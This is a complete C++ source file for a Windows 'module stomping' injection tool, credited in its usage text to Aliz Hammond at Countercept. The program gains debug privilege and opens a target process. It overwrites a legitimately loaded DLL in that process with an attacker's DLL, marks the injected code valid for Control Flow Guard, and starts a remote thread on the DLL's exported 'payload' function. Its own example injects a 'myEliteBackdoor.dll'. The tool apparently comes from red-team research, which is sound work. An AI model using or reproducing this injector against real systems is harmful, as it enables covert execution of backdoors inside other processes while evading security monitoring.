#include "pch.h"
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlwapi.h>

#include <exception>
#include <sstream>
#include <vector>
#include <map>
#include <codecvt>

#include "../injectionUtils/public.h"


void doUsage(int argc, TCHAR *argv[])
{
	printf("Module stomping injection tool, by Aliz Hammond at Countercept\n");
	printf("This tool will inject a DLL into a target process by overwriting a specified legitimate module in the target.\n");
	printf("The injected DLL must have a compatible memory layout with the legitimate module it overwrites.\n");
	printf("Usage: %S <target process name> <DLL to inject> <module to overwrite>\n", argv[0]);
	printf("eg. %S snippingtool.exe C:\\myEliteBackdoor.dll d3d10.dll\n", argv[0]);
}

unsigned long long resolveImport(HANDLE toScanHandle, std::map<std::wstring, moduleInMemory*>* modules, std::wstring moduleName, std::wstring functionName)
{
	// If we haven't seen this module before, get some info about it (and load it if needed)
	std::map<std::wstring, moduleInMemory*>::iterator it = modules->find(moduleName);
	if (it == modules->end())
	{
		// Is it loaded already?
		void* moduleToStompBase = getModuleBase(toScanHandle, moduleName.c_str());
		if (moduleToStompBase == NULL)
		{
			// Not loaded already, so load it into the target address space
			injectLoadLibrary(toScanHandle, moduleName.c_str());
		}

		// Now construct some info about this module.
		modules->insert(std::pair<std::wstring, moduleInMemory*>(moduleName, new moduleInMemory(toScanHandle, moduleToStompBase)));
		it = modules->find(moduleName);
	}

	// Finally, we can look up the export itself.
	// If it is forwarded, we resolve it recursively.
	exportedFunc* resolvedImport = (*it).second->getExport(functionName);
	if (resolvedImport->isForwarded)
		return resolveImport(toScanHandle, modules, resolvedImport->forwardedModuleName, resolvedImport->forwardedFunctionName);

	return resolvedImport->functionPointerSite;
}

int wmainWrapped(int argc, TCHAR *argv[]) 
{
	if (argc != 4)
	{
		doUsage(argc, argv);
		return -1;
	}

	TCHAR* targetProcessName = argv[1];
	TCHAR* targetModuleName = argv[2];
	TCHAR* moduleToStompFilename = argv[3];

	// Load the module that the user wants to inject into the target process.
	moduleFromDisk sourceModule(targetModuleName);

	DWORD targetPid = getPIDForProcessByName(targetProcessName);
	if (targetPid == 0)
	{
		std::wstringstream os(L"");
		os << "Can't find process" << targetProcessName;
		throw errorMaker::wruntime_error(&os);
	}

	if (!EnableDebugPrivilege(TRUE))
		throw std::exception("Couldn't enable debug privilege\n");

	HANDLE toScanHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS | PROCESS_SUSPEND_RESUME, FALSE, targetPid);
	if (toScanHandle == NULL)
	{
		std::wstringstream os(L"");
		os << "Couldn't open target process (PID " << targetPid << "), GetLastError " << GetLastError();
		throw errorMaker::wruntime_error(&os);
	}

	// Convince the target to load the library we're going to stomp on top of. We just inject a thread to LoadLibraryA.
	void* moduleToStompBase = injectLoadLibrary(toScanHandle, moduleToStompFilename);

	// Find the module we'll be overwriting
	moduleInMemory targetModule = moduleInMemory(toScanHandle, moduleToStompBase);

	// And inject each section in turn.
	for (unsigned int sectionIndex = 0; sectionIndex < sourceModule.sections.size(); sectionIndex++)
	{
		section srcSect = sourceModule.sections[sectionIndex];
		printf("Overwriting section '%S'..\n", srcSect.name.c_str());

		// Check perms match OK
		bool foundOK = false;
		for (unsigned int n = 0; n < targetModule.sections.size(); n++)
		{
			section* dstSect = &targetModule.sections[n];
			if ((srcSect.VirtualAddress >= dstSect->VirtualAddress) &&
				(srcSect.VirtualAddress <= dstSect->VirtualAddress + dstSect->VirtualSize))
			{
				DWORD dstAttr = dstSect->Characteristics;
				DWORD srcAttr = srcSect.Characteristics;

				// Attributes are only important for memory permissions.
				bool srcR = srcAttr & IMAGE_SCN_MEM_READ;
				bool srcW = srcAttr & IMAGE_SCN_MEM_WRITE;
				bool srcE = srcAttr & IMAGE_SCN_MEM_EXECUTE;
				bool dstR = dstAttr & IMAGE_SCN_MEM_READ;
				bool dstW = dstAttr & IMAGE_SCN_MEM_WRITE;
				bool dstE = dstAttr & IMAGE_SCN_MEM_EXECUTE;
				
				// We can put RO code into a RW area.
				if ( dstR && dstW && srcR )
					srcW = true;

				// Do the permissions differ between what we're trying to load and memory itself?
				if ((srcR != dstR) || (srcW != dstW) || (srcE != dstE))
				{
					printf("Cannot stomp memory at source VA 0x%08lx: permissions mismatch!\n", srcSect.VirtualAddress);
					printf("%S section '%S' requires permissions %s%s%s\n",
						targetModuleName,
						srcSect.name.c_str(),
						srcR ? "R" : "",
						srcW ? "W" : "",
						srcE ? "E" : "");
					printf("%S section '%S' has permissions %s%s%s\n",
						moduleToStompFilename,
						dstSect->name.c_str(),
						dstR ? "R" : "",
						dstW ? "W" : "",
						dstE ? "E" : "");
					return -1;
				}
				foundOK = true;
				break;
			}
		}
		if (!foundOK)
		{
			section* dstByName = sourceModule.getSectionByName(srcSect.name);
			std::wstringstream os(L"");
			if (dstByName != NULL)
				os << "Can't find section to overwrite for source section " << srcSect.name << " - maybe try " << std::hex << dstByName->VirtualAddress << " instead of " << srcSect.VirtualAddress  << " ?";
			else
				os <<  "Can't find section to overwrite for source section " << srcSect.name;
			throw errorMaker::wruntime_error(&os);
		}

		// If we're writing executable code, then we should also add exceptions to the CFG bitmap.
		if (srcSect.Characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			for (unsigned int n = 0; n < srcSect.VirtualSize; n += 16)
				targetModule.markCFGValid(n);
		}

		if (srcSect.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
		{
			unsigned char* sectionData = (unsigned char*)malloc(srcSect.VirtualSize);
			memset(sectionData, 0x00, srcSect.VirtualSize);
			targetModule.writeToModule(sectionData, srcSect.VirtualAddress, srcSect.VirtualSize);
			free(sectionData);
		}
		else
		{
			// printf("Writing 0x%08lx bytes starting at 0x%08lx\n", srcSect.VirtualSize, srcSect.VirtualAddress);
			unsigned char* sectionData = (unsigned char*)malloc(srcSect.VirtualSize);
			sourceModule.readFromModule(srcSect.VirtualAddress, sectionData, srcSect.VirtualSize);
			targetModule.writeToModule(sectionData, srcSect.VirtualAddress, srcSect.VirtualSize);
			free(sectionData);
		}
	}

	// Now rebuild the import table.
	printf("Rebuilding imports..\n");
	std::map<std::wstring, moduleInMemory*> moduleCache;
	for (unsigned int n = 0; n < sourceModule.imports.size(); n++)
	{
		unsigned long long FPRVA = (unsigned long long)sourceModule.imports[n].functionPointerRVA;
		unsigned long long resolved = resolveImport(toScanHandle, &moduleCache, sourceModule.imports[n].moduleName, sourceModule.imports[n].functionName);
		targetModule.writeToModule(&resolved, FPRVA, sizeof(unsigned long long));
	}
	
	// Apply any relocations
	printf("Applying relocations..\n");
	for (unsigned int n = 0; n < sourceModule.relocs.size(); n++)
	{
		unsigned long long fixedUp;
		targetModule.readFromModule(sourceModule.relocs[n].targetSite, &fixedUp, sourceModule.relocs[n].size);
		fixedUp += (((unsigned long long)targetModule.targetModuleBase) - sourceModule.preferredBaseAddress );
		targetModule.writeToModule(&fixedUp, sourceModule.relocs[n].targetSite, sourceModule.relocs[n].size);
		printf("Location %llx now %llx\n", sourceModule.relocs[n].targetSite, fixedUp);
	}

	// Call the module's entrypoint so the CRT can initialise
	printf("Calling module entrypoint..\n");
	unsigned long long args[3] = { (unsigned long long)targetModule.targetModuleBase, DLL_PROCESS_ATTACH, 0 };
	targetModule.injectThread(sourceModule.entrypoint, args, 3 );

	unsigned long long args2[3] = { (unsigned long long)targetModule.targetModuleBase, DLL_THREAD_ATTACH, 0 };
	targetModule.injectThread(sourceModule.entrypoint, args2, 3);
	
	// Call the TLS callbacks
	printf("Calling TLS callbacks..\n");
	for (unsigned int n = 0; n < sourceModule.TLSCallbacks.size(); n++)
		targetModule.injectThread(sourceModule.TLSCallbacks[n], NULL, 0);
	
	// Finally, start a remote thread to call the entry point.
	// If 'payload' doesn't exist, try the C++ mangled void(void) style.
	exportedFunc* payloadExp = NULL;
	if (sourceModule.hasExport(L"payload"))
		payloadExp = sourceModule.getExport(L"payload");
	else if (sourceModule.hasExport(L"_Z7payloadv"))
		payloadExp = sourceModule.getExport(L"_Z7payloadv");
	else
		throw std::exception("Injected code does not export 'payload' function\n");

	printf("Starting payload thread\n");
	targetModule.injectThread(payloadExp->functionPointerRVA, NULL, 0, false);

	printf("All OK.\n");

	return 0;
}


int wmain(int argc, TCHAR *argv[])
{
	try
	{
		return wmainWrapped(argc, argv);
	}
	catch (std::exception& e)
	{
		printf("Exception:\n");
		printf(e.what());
	}
}
